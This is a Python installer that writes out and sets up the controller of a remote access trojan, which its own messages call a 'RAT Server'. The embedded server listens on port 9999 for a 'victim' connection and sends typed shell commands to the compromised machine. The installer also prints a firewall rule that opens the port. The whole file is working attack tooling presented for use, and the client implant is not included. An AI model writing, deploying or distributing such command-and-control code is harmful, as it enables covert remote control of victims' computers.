import os
import sys
import subprocess
import shutil
import platform

SERVER_CODE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'
PORT = 9999

def main():
    print("--- RAT Server Started ---")
    print("Waiting for victim to connect...")
    print("NOTE: If connected, the client terminal will now echo commands you type here.")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to bind: {e}")
        sys.exit(1)

    print("[*] Waiting for connection...")
    client, addr = server.accept()
    print(f"[+] Connection received from {addr}")
    print("[*] You are now connected. Try typing 'whoami' or 'dir'.")
    print("[*] Type 'exit' to quit.")

    while True:
        try:
            # Ensure the prompt is always printed clearly
            cmd = input("# Command: ")
            
            if cmd.lower() == 'exit':
                print("[*] Sending exit command...")
                client.send('exit'.encode())
                break
            
            print(f"[*] Sending command: {cmd}")
            client.send(cmd.encode())
            
            # Wait for response with a timeout mechanism handled by the client sending data
            # If the client sends the "Success" message, this will receive it.
            data = client.recv(4096)
            
            if not data:
                print("[!] Connection closed by remote host (No data received).")
                break
            
            response = data.decode()
            if response:
                print("[Response from client]:")
                print(response)
            else:
                print("[!] Received empty response. Something is wrong.")
                
        except KeyboardInterrupt:
            print("[*] Interrupted by user. Closing connection.")
            break
        except Exception as e:
            print(f"[!] Error occurred: {e}")
            print("[*] Connection likely lost. Exiting.")
            break

    try:
        client.close()
        server.close()
    except:
        pass
    print("[*] Server shut down.")

if __name__ == "__main__":
    main()
"""

def main():
    print("[*] RAT Server Installer")
    print("[*] Checking for Python...")
    
    if not shutil.which("python3") and not shutil.which("python"):
        print("[-] Error: Python is not installed or not in PATH.")
        sys.exit(1)
        
    python_cmd = "python3" if shutil.which("python3") else "python"
    
    script_name = "control_panel.py"
    script_path = os.path.join(os.getcwd(), script_name)
    
    print(f"[*] Creating {script_name}...")
    with open(script_path, "w") as f:
        f.write(SERVER_CODE)
        
    print(f"[+] Created {script_path}")
    print(f"\n[!] To run the server: {python_cmd} {script_path}")
    print("[!] Ensure your firewall allows incoming connections on port 9999.")
    
    if platform.system() == "Windows":
        print("\n[!] Windows Users: You may need to create a firewall exception manually.")
        print("    Run this in PowerShell as Administrator to allow Python:")
        print(f'    New-NetFirewallRule -DisplayName "AllowPython" -Direction Inbound -Action Allow -Program "{shutil.which(python_cmd).strip()}"')

if __name__ == "__main__":
    main()
